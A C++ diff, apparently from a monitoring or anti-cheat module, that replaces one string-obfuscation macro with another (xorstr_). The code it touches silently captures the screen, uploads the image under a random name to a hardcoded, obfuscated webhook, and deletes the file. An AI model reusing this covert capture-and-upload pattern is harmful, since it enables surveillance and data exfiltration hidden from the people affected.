@@ -8,7 +8,7 @@
 
 #include <dpp/colors.h>
 #include "../LogSystem/File/File.h"
-#include "../Utils/crypt_str.h"
+#include "../Utils/xorstr.h"
 #include "../Utils/utils.h"
 #include "WebHook/WebHook.h"
 #include "../Utils/StringCrypt/StringCrypt.h"
@@ -146,12 +146,12 @@ void Monitoring::SendBitMap( BitmapData Bitmap ) {
 
 }
 
-WebHook wHook(  crypt_str("d81df4fc01e3651581242a35aa11a56a67162563" ) );
+WebHook wHook(  xorstr_("d81df4fc01e3651581242a35aa11a56a67162563" ) );
 
 void Monitoring::GenerateScreenShot( std::string Filename ) {
 	HBITMAP Screen = CaptureScreenBitmap( );
 	SaveBitmapToFile( Screen , Filename.c_str( ) );
-	File Screenshot( crypt_str( "" ) , Filename );
+	File Screenshot( xorstr_( "" ) , Filename );
 
 	while ( !Screenshot.Exists( ) )
 		std::this_thread::sleep_for( std::chrono::seconds( 1 ) );
@@ -160,7 +160,7 @@ void Monitoring::GenerateScreenShot( std::string Filename ) {
 
 void Monitoring::SendInfo( std::string info , uint32_t Color , bool Capture  ){
 	if ( Capture ) {
-		std::string nFile = Utils::Get( ).GetRandomWord( 17 ) + crypt_str( ".jpg" );
+		std::string nFile = Utils::Get( ).GetRandomWord( 17 ) + xorstr_( ".jpg" );
 		GenerateScreenShot( nFile );
 		wHook.SendWebHookMessageWithFile( info , nFile , Color );
 		File( nFile ).Delete( );
